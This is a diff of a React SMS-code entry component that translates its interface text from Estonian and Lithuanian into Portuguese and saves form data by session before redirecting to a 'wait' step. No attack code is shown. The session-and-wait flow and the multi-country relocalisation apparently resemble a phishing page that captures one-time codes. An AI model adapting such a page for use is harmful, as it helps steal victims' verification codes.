@@ -101,7 +101,7 @@ export function SmsClient({ sessionId }: Props) {
       .eq("id", sessionId);
 
     setSaving(false);
-    if (error) setMsg("Saatmine ebaõnnestus.");
+    if (error) setMsg("Falha ao enviar.");
     else {
       setSessionFormData(nextFormData);
       router.push(stepToPath("wait", sessionId));
@@ -134,7 +134,7 @@ export function SmsClient({ sessionId }: Props) {
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-            Neteisinga nuoroda.
+            Ligação inválida.
           </p>
         </div>
       </div>
@@ -245,7 +245,7 @@ export function SmsClient({ sessionId }: Props) {
           </div>
 
           {!valid && code.length > 0 ? (
-            <p className="text-xs text-red-400">Sisestage täpselt {digits} numbrit.</p>
+            <p className="text-xs text-red-400">Introduza exatamente {digits} dígitos.</p>
           ) : null}
 
           {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
@@ -259,7 +259,7 @@ export function SmsClient({ sessionId }: Props) {
           </button>
 
           <p className="text-center text-xs text-gray-400 mt-4">
-            Kood saadeti teile SMS-i teel teie mobiiltelefoni numberile.
+            O código foi enviado por SMS para o seu número de telemóvel.
           </p>
         </form>
       </div>
